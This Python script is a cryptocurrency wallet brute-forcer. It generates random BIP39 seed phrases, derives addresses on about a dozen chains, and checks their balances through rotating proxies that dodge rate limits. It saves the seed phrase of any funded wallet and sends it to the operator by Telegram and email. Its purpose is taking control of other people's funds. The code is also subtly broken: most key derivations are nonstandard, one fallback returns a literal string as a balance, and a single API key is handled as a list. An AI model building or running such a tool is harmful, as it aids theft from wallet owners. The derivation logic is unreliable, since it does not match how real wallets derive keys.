from mnemonic import Mnemonic
from web3 import Web3
import ecdsa
import hashlib
import base58
import random
import threading
from solders.keypair import Keypair
from tronpy import Tron
from tronpy.keys import PrivateKey
from pymongo import MongoClient
from bson import ObjectId
import requests
from datetime import datetime, timezone
import time
from telegram_bot import TelegramBot
import asyncio
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from dotenv import load_dotenv
import os
from bitcoinlib.keys import HDKey


# Load environment variables
load_dotenv()
TELEGRAM_API_TOKEN = os.getenv("TELEGRAM_API_TOKEN")

# API KEYS (Replace with your own)
ETHERSCAN_API = os.getenv("ETHERSCAN_API")
BSCSCAN_API = os.getenv("BSCSCAN_API")
ALCHEMY_POLYGON_API = os.getenv("ALCHEMY_POLYGON_API")

# 🔹 Your Email Configuration (Update with your details)
SMTP_SERVER = os.getenv("SMTP_SERVER")
SMTP_PORT = os.getenv("SMTP_PORT")  # Use 465 for SSL, or 587 for TLS
EMAIL_SENDER = os.getenv("EMAIL_SENDER")
EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD")
EMAIL_RECEIVER = os.getenv("EMAIL_RECEIVER")

# Telegram
telegram_bot = TelegramBot()

# Connect to MongoDB
uri = os.getenv("MONGO_URI")

# Connect to MongoDB Atlas cluster
client = MongoClient(uri)

# Select the database and collection
db = client['wallet_db']  # Replace with your actual database name if needed
wallets_collection = db['wallets']
config_collection = db["config"]

# Load BIP39 wordlist from a file
with open("wordlist.txt", "r") as file:
    wordlist = [word.strip() for word in file.readlines()]

# Initialize Mnemonic checker
mnemo = Mnemonic("english")


api_cooldown = {}  # Track failed API keys
bsc_cooldown = {}  # Track failed API keys
checked_addresses = {}

def get_eth_api_key():
    """Fetch the latest ETH API key from MongoDB."""
    key_entry = config_collection.find_one({"name": "eth_api_key"})
    return key_entry["value"] if key_entry else None

def get_next_account_name():
    """
    Determines the next account name based on the count of existing wallets.
    """
    count = wallets_collection.count_documents({})
    return f"Account {count + 1}"

def get_formatted_timestamp():
    """Returns a timestamp in both ISO and human-readable format."""
    now = datetime.now(timezone.utc)
    iso_format = now.isoformat()  # Example: "2024-06-01T12:34:56.123456+00:00"
    human_readable = now.strftime("%B %d, %Y | %I:%M:%S %p UTC")  # Example: "June 1, 2024 | 12:34:56 PM UTC"
    
    return iso_format, human_readable

def send_email(subject, body):
    """Sends an email notification when a wallet with funds is found."""
    try:
        msg = MIMEMultipart()
        msg["From"] = EMAIL_SENDER
        msg["To"] = EMAIL_RECEIVER
        msg["Subject"] = subject
        msg.attach(MIMEText(body, "plain"))

        # Connect to the SMTP server and send email
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()  # Secure the connection
        server.login(EMAIL_SENDER, EMAIL_PASSWORD)
        server.send_message(msg)
        server.quit()

        print("📧 Email sent successfully!")
    except Exception as e:
        print(f"❌ Email failed to send: {e}")
    
# Define a wallet with funds
def store_wallet(seed_phrase, coins_with_funds):
    if coins_with_funds:  # Only save if at least one coin has a balance
        account_name = get_next_account_name()
        iso_timestamp, readable_timestamp = get_formatted_timestamp()

        # Generate comment summarizing which coins have funds
        comment = f"💰 Found funds in {len(coins_with_funds)} coins: " + ", ".join(
            [f"{coin['coin_name']} ({coin['balance']})" for coin in coins_with_funds]
        )

        wallet_data = {
            "account_name": account_name,
            "seed_phrase": seed_phrase,
            "coins": coins_with_funds,
            "timestamp_iso": iso_timestamp,
            "timestamp_human": readable_timestamp,
            "comment": comment
        }

        # Insert into MongoDB
        result = wallets_collection.insert_one(wallet_data)
        asyncio.run(telegram_bot.send_message(f"🚀🚀 BOOM 🚀🚀\nNew Wallet Found 🤑🤑🤑\n✅ Wallet stored with ID: {result.inserted_id} 🚀\n🔹 Details: {comment}\n🕒 Stored on: {readable_timestamp}"))
        print(f"✅ Wallet stored with ID: {result.inserted_id}")
        print(f"💾 {comment}")

        subject = f"🚨 Lost Wallet Found: {account_name}"
        body = f"""
        🚀🚀🤑🤑 BOOM 🤑🤑🚀🚀
        A wallet with funds has been found and stored in MongoDB.

        🔹 Account Name: {account_name}
        🔹 Timestamp: {readable_timestamp}
        🔹 Coins Found: 
        {comment}

        📌 Seed Phrase: {seed_phrase}
        🔍 Check the database for full wallet details.
        """
        send_email(subject, body)
    else:
        print("❌ No balance found, skipping MongoDB storage.")

async def check_balance_once(address, check_function):
    """Only check balance if it hasn’t been checked before."""
    if address in checked_addresses:
        return checked_addresses[address]
    
    balance = await check_function(address)
    checked_addresses[address] = balance  # Cache result
    return balance

def get_random_api_key(api_list, cooldown_dict):
    """Select a working API key (avoids failed ones)."""
    available_keys = [key for key in api_list if key not in cooldown_dict or time.time() > cooldown_dict[key]]
    
    if available_keys:
        return random.choice(available_keys)
    else:
        print("⚠️ All API keys in cooldown! Resetting cooldowns & retrying...")
        cooldown_dict.clear()  # ✅ Reset cooldowns
        return random.choice(api_list)

def mark_api_cooldown(api_key, cooldown_dict, cooldown_time=10):
    """Put an API key into cooldown for a set time (default: 10 sec)."""
    cooldown_dict[api_key] = time.time() + cooldown_time

def get_btc_balance(address):
    """Check Bitcoin (BTC) balance."""
    url = f"https://blockchain.info/q/addressbalance/{address}"
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            return int(response.text) / 1e8  # Convert satoshis to BTC
    except Exception as e:
        print(f"BTC API Error: {e}")
    return 0

def get_eth_balance(address):
    """Check Ethereum (ETH) balance using Etherscan API."""
    new_api_eth = get_eth_api_key()
    
    if not new_api_eth:
        print("⚠️ No ETH API key found in MongoDB!")
        new_api_eth = "f{ETHERSCAN_API}"
        return new_api_eth
        
    url = f"https://api.etherscan.io/api?module=account&action=balance&address={address}&apikey={new_api_eth}"
    try:
        response = requests.get(url, timeout=3).json()
        return int(response["result"]) / 1e18  # Convert wei to ETH
    except Exception as e:
        print(f"ETH API Error ({ETHERSCAN_API}): {e}") # Mark API as failed
        return 0

def get_doge_balance_(address):
    """Check Dogecoin (DOGE) balance using BlockCypher API."""
    url = f"https://api.blockcypher.com/v1/doge/main/addrs/{address}/balance"
    
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            data = response.json()
            return float(data["balance"]) / 1e8  # Convert Satoshis to DOGE
        else:
            print(f"DOGE API Error: {response.text}")
    except Exception as e:
        print(f"DOGE API Error: {e}")
    
    return 0

def get_doge_balance_v(address):
    """Check Dogecoin (DOGE) balance using SoChain API."""
    url = f"https://sochain.com/api/v2/get_address_balance/DOGE/{address}"

    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            data = response.json()
            return float(data["data"]["confirmed_balance"])  # ✅ DOGE balance
        else:
            print(f"DOGE API Error: {response.text}")
    except Exception as e:
        print(f"DOGE API Error: {e}")

    return 0

def get_ltc_balance_v1(address):
    """Check Litecoin (LTC) balance using BlockCypher API."""
    url = f"https://api.blockcypher.com/v1/ltc/main/addrs/{address}/balance"

    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            data = response.json()
            return float(data.get("balance", 0)) / 1e8  # Convert from satoshis to LTC
        else:
            print(f"LTC API Error: {response.text}")
    except Exception as e:
        print(f"LTC API Error: {e}")

    return 0

def get_usdt_erc20_balance(address):
    """Check USDT ERC-20 balance using Etherscan API."""
    new_api_eth = get_eth_api_key()
    
    if not new_api_eth:
        print("⚠️ No ETH API key found in MongoDB!")
        new_api_eth = "f{ETHERSCAN_API}"
        return new_api_eth
        
    url = f"https://api.etherscan.io/api?module=account&action=tokenbalance&contractaddress=0xdAC17F958D2ee523a2206206994597C13D831ec7&address={address}&apikey={new_api_eth}"
    try:
        response = requests.get(url, timeout=3).json()
        return int(response["result"]) / 1e6  # USDT has 6 decimals
    except Exception as e:
        print(f"USDT ERC-20 API Error ({ETHERSCAN_API}): {e}")
        return 0

def get_bnb_bep20_balance(address):
    """Check BNB (BEP-20) balance on Binance Smart Chain (BSCScan API)."""
    if not address.startswith("0x"):  # Ensure correct address format
        return "Invalid BEP-20 Address"
    
    bscscan_api_key = get_random_api_key(BSCSCAN_API, bsc_cooldown)
    
    url = f"https://api.bscscan.com/api?module=account&action=balance&address={address}&apikey={bscscan_api_key}"
    try:
        response = requests.get(url, timeout=3).json()
        return int(response["result"]) / 1e18  # Convert wei to BNB
    except Exception as e:
        print(f"BNB BEP-20 API Error ({bscscan_api_key}): {e}")
        mark_api_cooldown(bscscan_api_key, bsc_cooldown)
        return 0

def get_bnb_bep2_balance(address):
    """Check BNB (BEP-2) balance on Binance Chain (Binance API)."""
    if not address.startswith("bnb"):  # Ensure correct address format
        return "Invalid BEP-2 Address"
    
    url = f"https://dex.binance.org/api/v1/account/{address}"
    try:
        response = requests.get(url, timeout=3).json()
        
        # Find native BNB balance
        for balance in response.get("balances", []):
            if balance["symbol"] == "BNB":
                return float(balance["free"])
        return 0
    except Exception as e:
        print(f"BNB BEP-2 API Error: {e}")
        return 0

def get_trx_balance(address):
    """Check Tron Balance."""
    url = f"https://apilist.tronscan.org/api/account?address={address}"
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            data = response.json()
            
            # ✅ Get TRX balance from "balance" field (Convert to TRX from Sun)
            trx_balance = float(data.get("balance", 0)) / 1e6  
            return trx_balance
        else:
            print(f"TRX API Error: {response.text}")
    except Exception as e:
        print(f"TRX API Error: {e}")

    return 0

def get_usdt_trc20_balance(address):
    """Check USDT TRC-20 balance on Tron."""
    url = f"https://apilist.tronscan.org/api/account?address={address}"
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            data = response.json()
            
            # ✅ Extract TRC-20 token balances
            trc20_balances = data.get("trc20token_balances", [])
            for token in trc20_balances:
                if token.get("tokenAbbr") == "USDT":
                    return float(token.get("balance", 0)) / 1e6  # Convert from 6 decimals
            
        else:
            print(f"USDT (TRC-20) API Error: {response.text}")
    except Exception as e:
        print(f"USDT (TRC-20) API Error: {e}")

    return 0

def get_sol_balance(address):
    """Check Solana (SOL) balance using public API."""
    url = f"https://api.mainnet-beta.solana.com"
    data = {
        "jsonrpc": "2.0",
        "id": 1,
        "method": "getBalance",
        "params": [address]
    }
    try:
        response = requests.post(url, json=data, timeout=5).json()
        return response["result"]["value"] / 1e9  # Convert lamports to SOL
    except Exception as e:
        print(f"SOL API Error: {e}")
    return 0

def get_matic_balance(address):
    """Check Polygon (MATIC) balance using Alchemy API."""
    url = f"https://polygon-mainnet.g.alchemy.com/v2/{ALCHEMY_POLYGON_API}"
    headers = {
    "Accept": "application/json",
    "Content-Type": "application/json"
    }

    data = {
        "jsonrpc": "2.0",
        "method": "alchemy_getTokenBalances",
        "params": [address, "erc20"],
        "id": 1
    }
    try:
        response = requests.post(url, headers=headers, json=data, timeout=5).json()

        if "result" in response and isinstance(response["result"], str):
            return int(response["result"], 16) / 1e18  # Convert Wei to MATIC
        else:
            return 0
        
    except Exception as e:
        print(f"MATIC API Error (Alchemy): {e}")
    return 0


# Generate mnemonic
def generate_valid_mnemonic(word_count=12):
    """Generate a valid BIP39 mnemonic with 12, 18, or 24 words."""
    while True:  # Keep generating until we get a valid one
        mnemonic = " ".join(random.sample(wordlist, word_count))
        if mnemo.check(mnemonic):  # Check if it's a valid mnemonic
            return mnemonic




PROXY_SERVER = "https://flask-vps.onrender.com/get_proxy"
BLOCKCHAIR_BASE_URL = "https://api.blockchair.com"
BLOCKCYPHER_BASE_URL = "https://api.blockcypher.com/v1"

async def get_proxy():
    """Fetch a new proxy from our Flask proxy server."""
    try:
        response = requests.get(PROXY_SERVER, timeout=15)
        if response.status_code == 200:
            proxy = response.json().get("proxy")
            print(f"Using proxy: {proxy}")
            return proxy
    except Exception as e:
        print(f"Proxy Server Error: {e}")

    return None  # If proxy fails, default to no proxy


async def get_balance(coin, address):
    """Fetch balance from Blockchair using our free proxy."""
    proxy = await get_proxy()  # ✅ Get a fresh proxy

    if not proxy:
        print("⚠️ No proxy available, using default connection.")
        proxy = None  # If no proxy, request normally

    url = f"{BLOCKCYPHER_BASE_URL}/{coin}/main/addrs/{address}/balance"

    try:
        response = requests.get(url, proxies={"http": proxy, "https": proxy}, timeout=5)
        if response.status_code == 200:
            data = response.json()
            return data.get("final_balance", 0) / 1e8  # Convert from satoshis
        else:
            print(f"{coin.upper()} API Error: {response.text}")
    except Exception as e:
        print(f"{coin.upper()} API Error: {e}")

    return 0  # Return 0 if all fails

async def get_blockchair_balance(coin, address):
    """Check balance using Blockchair API for ZEC & BCH."""
    proxy = await get_proxy()  # ✅ Get a fresh proxy

    if not proxy:
        print("⚠️ No proxy available, using default connection.")
        proxy = None 
        
    url = f"{BLOCKCHAIR_BASE_URL}/{coin}/dashboards/address/{address}"

    try:
        response = requests.get(url, proxies={"http": proxy, "https": proxy}, timeout=5)
        if response.status_code == 200:
            data = response.json()
            return float(data["data"][address]["address"]["balance"]) / 1e8  # Convert from satoshis
        else:
            print(f"{coin.upper()} API Error: {response.text}")
    except Exception as e:
        print(f"{coin.upper()} API Error: {e}")

    return 0  # Return 0 if failed



# Derive addresses
def derive_btc_address(mnemonic):
    """Derive a Bitcoin address from a BIP39 mnemonic (Electrum style)."""
    seed = mnemo.to_seed(mnemonic)
    private_key = hashlib.sha256(seed).digest()
    sk = ecdsa.SigningKey.from_string(private_key, curve=ecdsa.SECP256k1)
    vk = sk.verifying_key
    public_key = b"\x04" + vk.to_string()

    ripemd160 = hashlib.new("ripemd160")
    ripemd160.update(hashlib.sha256(public_key).digest())
    hashed_pubkey = ripemd160.digest()
    
    versioned_payload = b"\x00" + hashed_pubkey
    checksum = hashlib.sha256(hashlib.sha256(versioned_payload).digest()).digest()[:4]
    btc_address = base58.b58encode(versioned_payload + checksum).decode("utf-8")

    return btc_address

def derive_ltc_address(mnemonic):
    """Generate a Litecoin (LTC) address from mnemonic using bitcoinlib."""
    try:
        # Derive Litecoin HD key from mnemonic
        hdkey = HDKey.from_seed(mnemonic, network="litecoin")  
        return hdkey.address()  # ✅ Returns Litecoin address
    except Exception as e:
        print(f"🚨 LTC Address Generation Error: {e}")
        return None

def derive_matic_address(mnemonic):
    """Derive a Polygon (MATIC) address (same as Ethereum)."""
    seed = mnemo.to_seed(mnemonic)[:32]
    w3 = Web3()
    matic_address = w3.eth.account.from_key(seed).address
    return matic_address

def derive_eth_address(mnemonic):
    """Derive an Ethereum address from a BIP39 mnemonic."""
    seed = mnemo.to_seed(mnemonic)[:32]  # Get private key from seed
    w3 = Web3()
    eth_address = w3.eth.account.from_key(seed).address
    return eth_address

def derive_sol_address(mnemonic):
    """Derive an Solana address from a BIP39 mnemonic."""
    seed = mnemo.to_seed(mnemonic)[:32]  # Get private key from seed
    keypair = Keypair.from_seed(seed)
    sol_address = keypair.pubkey()
    return sol_address

def derive_bnb_bep2_address(mnemonic):
    """Derive a Binance BEP-2 address (Binance Chain)."""
    seed = mnemo.to_seed(mnemonic)[:32]
    private_key = hashlib.sha256(seed).digest()
    sk = ecdsa.SigningKey.from_string(private_key, curve=ecdsa.SECP256k1)
    vk = sk.verifying_key
    public_key = b"\x04" + vk.to_string()

    ripemd160 = hashlib.new("ripemd160")
    ripemd160.update(hashlib.sha256(public_key).digest())
    hashed_pubkey = ripemd160.digest()

    versioned_payload = b"\x0f" + hashed_pubkey  # Binance Chain uses `0x0f` prefix
    checksum = hashlib.sha256(hashlib.sha256(versioned_payload).digest()).digest()[:4]
    bnb_bep2_address = "bnb" + base58.b58encode(versioned_payload + checksum).decode("utf-8")

    return bnb_bep2_address

def derive_bnb_bep20_address(mnemonic):
    """Derive a Binance Smart Chain (BEP-20) address (same as Ethereum)."""
    seed = mnemo.to_seed(mnemonic)[:32]
    w3 = Web3()
    bep20_address = w3.eth.account.from_key(seed).address
    return bep20_address

def derive_trx_address(mnemonic):
    """Derive a Tron (TRX + USDT TRC20) address from a BIP39 mnemonic."""
    seed = mnemo.to_seed(mnemonic)[:32]  # Tron uses a 32-byte seed
    private_key = hashlib.sha256(seed).digest()  # Generate private key
    key = PrivateKey(private_key)
    trx_address = key.public_key.to_base58check_address()  # Generate TRON address

    return trx_address

def derive_doge_address(mnemonic):
    """Generate Dogecoin (DOGE) address from mnemonic using bitcoinlib."""
    try:
        hdkey = HDKey.from_seed(mnemonic, network="dogecoin")  # ✅ Dogecoin-specific key
        return hdkey.address()  # ✅ Returns DOGE address
    except Exception as e:
        print(f"🚨 DOGE Address Generation Error: {e}")
        return None

def derive_dash_address_old(mnemonic):
    """Generate a Dash (DASH) address from mnemonic using bitcoinlib."""
    try:
        hdkey = HDKey.from_seed(mnemonic, network="dash")  
        return hdkey.address()
    except Exception as e:
        print(f"🚨 DASH Address Generation Error: {e}")
        return None

def derive_bch_address_old(mnemonic):
    """Generate a Bitcoin Cash (BCH) address from mnemonic using bitcoinlib."""
    try:
        hdkey = HDKey.from_seed(mnemonic, network="bitcoin_cash")  
        return hdkey.address()
    except Exception as e:
        print(f"🚨 BCH Address Generation Error: {e}")
        return None

def derive_zec_address_old(mnemonic):
    """Generate a Zcash (ZEC) address from mnemonic using bitcoinlib."""
    try:
        hdkey = HDKey.from_seed(mnemonic, network="zcash")  
        return hdkey.address()
    except Exception as e:
        print(f"🚨 ZEC Address Generation Error: {e}")
        return None

def derive_dash_address(mnemonic):
    """Generate a Dash (DASH) address from mnemonic using bitcoinlib."""
    try:
        hdkey = HDKey.from_passphrase(mnemonic, network="dash")  
        return hdkey.address()
    except Exception as e:
        print(f"🚨 DASH Address Generation Error: {e}")
        return None

def derive_bch_address(mnemonic):
    """Generate a Bitcoin Cash (BCH) address from mnemonic using bitcoinlib."""
    try:
        hdkey = HDKey.from_passphrase(mnemonic, network="bitcoin_cash")  
        return hdkey.address()
    except Exception as e:
        print(f"🚨 BCH Address Generation Error: {e}")
        return None

def derive_zec_address(mnemonic):
    """Generate a Zcash (ZEC) address from mnemonic using bitcoinlib."""
    try:
        hdkey = HDKey.from_passphrase(mnemonic, network="zcash")  
        return hdkey.address()
    except Exception as e:
        print(f"🚨 ZEC Address Generation Error: {e}")
        return None
        
async def process_wallets():
    """Main function that generates mnemonics, derives wallet addresses, checks balances, and loops infinitely."""
    # start_time = time.time()

    mnemonic_12 = generate_valid_mnemonic(12)
    mnemonic_18 = generate_valid_mnemonic(18)
    mnemonic_24 = generate_valid_mnemonic(24)

    mnemonics = [(mnemonic_12, 12), (mnemonic_18, 18), (mnemonic_24, 24)]
    threads = []

    for mnemonic, words in mnemonics:
        await process_single_wallet(mnemonic, words)
        
    print("Checking wallets...")
    time.sleep(2)

async def process_single_wallet(mnemonic, words):
    """Process a single wallet: derive addresses & check balances."""
    print("Address checking started")
    btc_address = derive_btc_address(mnemonic)
    eth_address = derive_eth_address(mnemonic)
    sol_address = str(derive_sol_address(mnemonic))
    bep2_address = derive_bnb_bep2_address(mnemonic)
    bep20_address = derive_bnb_bep20_address(mnemonic)
    trx_address = derive_trx_address(mnemonic)
    poly_address = derive_matic_address(mnemonic)
    doge_address = derive_doge_address(mnemonic)
    ltc_address = derive_ltc_address(mnemonic)
    dash_address = derive_dash_address(mnemonic)
    bch_address = derive_bch_address(mnemonic)
    zec_address = derive_zec_address(mnemonic)

    print("Balance checking started")
    ltc_balance = await get_balance("ltc", ltc_address)
    doge_balance = await get_balance("doge", doge_address)
    dash_balance = await get_balance("dash", dash_address)
    bch_balance = await get_blockchair_balance("bitcoin-cash", bch_address)
    zec_balance = await get_blockchair_balance("zcash", zec_address)


    btc_balance = await check_balance_once(btc_address, get_btc_balance)
    eth_balance = await check_balance_once(eth_address, get_eth_balance)
    usdt_eth_balance = await check_balance_once(eth_address, get_usdt_erc20_balance)
    sol_balance = await check_balance_once(sol_address, get_sol_balance)
    bnb_bep2_balance = await check_balance_once(bep2_address, get_bnb_bep2_balance) if bep2_address.startswith("bnb") else "Invalid Address"
    bnb_bep20_balance = await check_balance_once(bep20_address, get_bnb_bep20_balance) if bep20_address.startswith("0x") else "Invalid Address"

    trx_balance = await check_balance_once(trx_address, get_trx_balance)
    usdt_trc_balance = await check_balance_once(trx_address, get_usdt_trc20_balance)

    matic_balance = await check_balance_once(poly_address, get_matic_balance)

    print("Organizing started")
    # Organize all coin data
    coins = [
        {"coin_name": "Bitcoin", "id": "BTC", "address": btc_address, "balance": btc_balance},
        {"coin_name": "Ethereum", "id": "ETH", "address": eth_address, "balance": eth_balance},
        {"coin_name": "USDT (ERC-20)", "id": "USDT-ERC20", "address": eth_address, "balance": usdt_eth_balance},
        {"coin_name": "Solana", "id": "SOL", "address": sol_address, "balance": sol_balance},
        {"coin_name": "BNB (BEP-2)", "id": "BNB-BEP2", "address": bep2_address, "balance": bnb_bep2_balance},
        {"coin_name": "BNB (BEP-20)", "id": "BNB-BEP20", "address": bep20_address, "balance": bnb_bep20_balance},
        {"coin_name": "Tron", "id": "TRX", "address": trx_address, "balance": trx_balance},
        {"coin_name": "USDT (TRC-20)", "id": "USDT-TRC20", "address": trx_address, "balance": usdt_trc_balance},
        {"coin_name": "Polygon (MATIC)", "id": "MATIC", "address": poly_address, "balance": matic_balance},
        {"coin_name": "DOGE", "id": "DOGE", "address": doge_address, "balance": doge_balance},
        {"coin_name": "LTC", "id": "LTC", "address": ltc_address, "balance": ltc_balance},
        {"coin_name": "Zcash", "id": "ZEC", "address": zec_address, "balance": zec_balance},
        {"coin_name": "DASH", "id": "DASH", "address": dash_address, "balance": dash_balance},
        {"coin_name": "Bitcoin Cash", "id": "BCH", "address": bch_address, "balance": bch_balance},
    ]

    # Filter only coins that have funds
    coins_with_funds = [coin for coin in coins if isinstance(coin["balance"], (int, float)) and coin["balance"] > 0]

    # Save to MongoDB only if a balance is found
    if coins_with_funds:
        store_wallet(mnemonic, coins_with_funds)

    # Print results
    print(f"\n✅ {words}-Word Mnemonic: {mnemonic}")
    for coin in coins:
        print(f"{coin['coin_name']} ({coin['id']}) Address: {coin['address']} | Balance: {coin['balance']}")
    print("-" * 80)

# def testing():
#     subject = f"🚨 Lost Wallet Found: Test"
#     body = f"""
#     🚀🚀🤑🤑 BOOM 🤑🤑🚀🚀
#     A wallet with funds has been found and stored in MongoDB.
#     🔹 *Account Name:* Acc test
#     🔹 *Timestamp:* Today

#     📌 *Seed Phrase:* love your father soo much
#     🔍 Check the database for full wallet details.
#     """
#     send_email(subject, body)


# testing()
    
# 08121534290
